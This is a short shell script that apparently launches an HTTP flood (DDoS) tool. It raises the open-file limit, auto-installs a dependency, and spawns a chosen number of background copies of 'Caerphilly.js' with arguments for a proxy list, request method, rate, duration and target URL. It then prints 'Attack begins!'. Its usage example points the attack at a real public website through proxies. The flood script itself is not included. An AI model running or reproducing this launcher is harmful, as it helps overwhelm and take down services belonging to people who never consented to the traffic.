
ulimit -n 1000000

fileName="Caerphilly.js"

if [ ! -d "./node_modules/chalk" ]; then
    npm install chalk
    echo "It has been installed automatically for you [ $fileName ] Script prepend [ chalk ]，Please re-run。"
    exit
fi

if [ ! -f "./$fileName" ]; then
    echo "\nScript [ $fileName ] Does not exist！\n"
    exit
fi

if [ $1 -gt 0 ];
then
  for n in $(seq 1 $1)
  do
    node $fileName $2 $3 $4 $5 $6 $7 &
  done
  echo "\n==============================\nAttack begins！\nScript：$fileName\nthread：$1\nTime：$5\nURL：$6\n==============================\n"
  exit
else
  echo "示例:./Caerphilly.sh 100 proxy.txt GET 10 60 http://cn.bing.com t"
fi